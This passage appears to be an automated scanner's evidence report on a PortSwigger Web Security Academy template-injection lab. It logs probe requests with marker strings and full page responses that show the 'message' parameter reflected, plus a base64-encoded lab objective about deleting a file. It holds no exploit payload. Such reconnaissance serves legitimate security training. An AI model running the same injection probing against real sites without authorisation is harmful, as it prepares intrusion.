+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;ecommerce&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;section class=&quot;ecoms-pageheader&quot;&gt;
+                        &lt;img src=&quot;/resources/images/shop.svg&quot;&gt;
+                    &lt;/section&gt;
+                    &lt;div&gt;Unfortunately this product is out of stockglfn8jz3in
+&lt;/div&gt;
+                    &lt;section class=&quot;container-list-tiles&quot;&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/52.jpg&quot;&gt;
+                            &lt;h3&gt;Hydrated Crackers&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $98.34
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=1&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/15.jpg&quot;&gt;
+                            &lt;h3&gt;Pet Experience Days&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $45.52
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=2&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/36.jpg&quot;&gt;
+                            &lt;h3&gt;Caution Sign&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $23.82
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=3&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/70.jpg&quot;&gt;
+                            &lt;h3&gt;Eye Projectors&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $87.83</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6j6pnk-3d</code> — <code>artifacts/_/ev-mr6j6pnk-3d/</code></div><div class="lbl">REQUEST</div><pre>GET /?message=benign-out-of-stock-value HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-encoding: gzip
+content-length: 2785
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsEcommerce.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;ecommerce&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;section class=&quot;ecoms-pageheader&quot;&gt;
+                        &lt;img src=&quot;/resources/images/shop.svg&quot;&gt;
+                    &lt;/section&gt;
+                    &lt;div&gt;benign-out-of-stock-value
+&lt;/div&gt;
+                    &lt;section class=&quot;container-list-tiles&quot;&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/52.jpg&quot;&gt;
+                            &lt;h3&gt;Hydrated Crackers&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $98.34
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=1&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/15.jpg&quot;&gt;
+                            &lt;h3&gt;Pet Experience Days&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $45.52
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=2&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/36.jpg&quot;&gt;
+                            &lt;h3&gt;Caution Sign&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $23.82
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=3&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/70.jpg&quot;&gt;
+                            &lt;h3&gt;Eye Projectors&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $87.83
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=4&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/7.jpg&quot;&gt;
+                            &lt;h3&gt;Conversation Controlling Lemon&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $83.15
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=5&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/48.jpg&quot;&gt;
+                            &lt;h3&gt;BBQ Suitcase&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $50.18
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=6&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/9.jpg&quot;&gt;
+                            &lt;h3&gt;Fur Babies&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $92.02
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=7&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/6.jpg&quot;&gt;
+                            &lt;h3&gt;Com-Tool&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $92.44
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=8&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/73.jpg&quot;&gt;
+                            &lt;h3&gt;Beat the Vacation Traffic&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $69.51
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=9&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/53.jpg&quot;&gt;
+                            &lt;h3&gt;High-End Gift Wrapping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $76.89
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=10&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/29.jpg&quot;&gt;
+                            &lt;h3&gt;Waterproof Tea Bags&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $65.86
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=11&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/42.jpg&quot;&gt;
+                            &lt;h3&gt;Pest Control Umbrella&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating3.png&quot;&gt;
+                            $28.31
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=12&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/58.jpg&quot;&gt;
+                            &lt;h3&gt;There is No &amp;apos;I&amp;apos; in Team&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $60.69
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=13&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/75.jpg&quot;&gt;
+                            &lt;h3&gt;Grow Your Own Spy Kit&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $90.96
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=14&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/21.jpg&quot;&gt;
+                            &lt;h3&gt;Snow Delivered To Your Door&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $62.09
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=15&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/20.jpg&quot;&gt;
+                            &lt;h3&gt;Single Use Food Hider&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $2.44
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=16&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/56.jpg&quot;&gt;
+                            &lt;h3&gt;More Than Just Birdsong&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating5.png&quot;&gt;
+                            $71.65
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=17&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/37.jpg&quot;&gt;
+                            &lt;h3&gt;The Giant Enter Key&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating4.png&quot;&gt;
+                            $25.01
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=18&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/51.jpg&quot;&gt;
+                            &lt;h3&gt;Real Life Photoshopping&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $30.87
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=19&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/31.jpg&quot;&gt;
+                            &lt;h3&gt;Couple&amp;apos;s Umbrella&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating1.png&quot;&gt;
+                            $44.03
+                            &lt;a class=&quot;button&quot; href=&quot;/product?productId=20&quot;&gt;View details&lt;/a&gt;
+                        &lt;/div&gt;
+                    &lt;/section&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6j6t18-3e</code> — <code>artifacts/_/ev-mr6j6t18-3e/</code></div><div class="lbl">REQUEST</div><pre>GET /?message=umbraR3fl3ct7788 HTTP/1.1
+Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-encoding: gzip
+content-length: 2779
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsEcommerce.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fserver-side-template-injection%2fexploiting%2flab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;ecommerce&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;section class=&quot;ecoms-pageheader&quot;&gt;
+                        &lt;img src=&quot;/resources/images/shop.svg&quot;&gt;
+                    &lt;/section&gt;
+                    &lt;div&gt;umbraR3fl3ct7788
+&lt;/div&gt;
+                    &lt;section class=&quot;container-list-tiles&quot;&gt;
+                        &lt;div&gt;
+                            &lt;img src=&quot;/image/productcatalog/products/52.jpg&quot;&gt;
+                            &lt;h3&gt;Hydrated Crackers&lt;/h3&gt;
+                            &lt;img src=&quot;/resources/images/rating2.png&quot;&gt;
+                            $98.34
